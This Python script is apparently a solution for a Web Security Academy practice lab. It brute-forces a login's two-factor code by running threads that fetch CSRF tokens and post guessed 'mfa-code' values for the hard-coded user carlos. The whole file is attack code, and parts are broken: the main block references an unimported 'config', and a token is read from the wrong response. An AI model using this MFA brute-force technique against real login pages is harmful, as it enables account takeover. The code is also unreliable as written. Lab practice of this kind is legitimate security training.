#! /usr/bin/env python3

from threading import Thread
from queue import Queue
import time
import sys
import requests
import re

csrf_regex = re.compile('[a-zA-Z0-9]{32}')
headers = {
        'User-Agent': 'Mozilla5/0',
        }
login_page = 'https://ac401fd81ee0fd26c0ddad6e00a000e5.web-security-academy.net/login'

creds = {'username': 'carlos', 'password': 'montoya'}
class RequestsThread(Thread):

    def __init__(self, queue):
        super().__init__()
        self.q = queue
        self.session = None 
        self.response = None 
        self.creds = {'username': 'carlos', 'password': 'montoya'}
        self.first_factor = 'https://ac401fd81ee0fd26c0ddad6e00a000e5.web-security-academy.net/login'

    def get_csrf_token(self, text):
        csrf_token = re.findall(csrf_regex, text)[0]
        return csrf_token

    def get_session(self):
        if self.session is None:
            self.session = requests.Session()
    
    def run(self):
        # Prevent connection resets:
        time.sleep(0.01)
        try:
            digit = self.q.get()
            with requests.Session() as req:
                # Obtain current csrf token from html on first factor
                # auth page
                response = req.get(login_page)
                if 'csrf' in response.text:
                    csrf_token = self.get_csrf_token(response.text)
                    creds.update({'csrf': csrf_token})
                    post_data = req.post(login_page, data=creds)
                    # Obtain second csrf token from html of second factor
                    # auth page
                    if 'csrf' in post_data.text:
                        new_url = post_data.url 
                        text = req.get(new_url)
                        new_csrf = self.get_csrf_token(post_data.text)
                        payload = {'mfa-code': digit.rstrip('\n'), 'csrf': new_csrf}
                        second_f = req.post(new_url, data=payload)
                        self.response = (second_f, digit)
        except Exception as err:
            print(err.args)
            pass

class ResponseGenerator(object):

    def __init__(self, num_threads, custom_thread, queue): 
        self.num_threads = num_threads
        self.threads = []
        self.position = 0
        self.custom_thread = custom_thread

        # Create some threads
        for i in range(num_threads):
            t = self.custom_thread(queue) 
            t.start()
            self.threads.append(t)

    def __iter__(self):
        return self

    def __next__(self):
        if self.position >= self.num_threads:
            raise StopIteration

        t = self.threads[self.position]
        self.position += 1

        t.join()
        # To not raise TypeError with NoneType slipping in
        if t.response is not None:
            return t.response

if __name__ == "__main__":
    print(config.HEADERS)
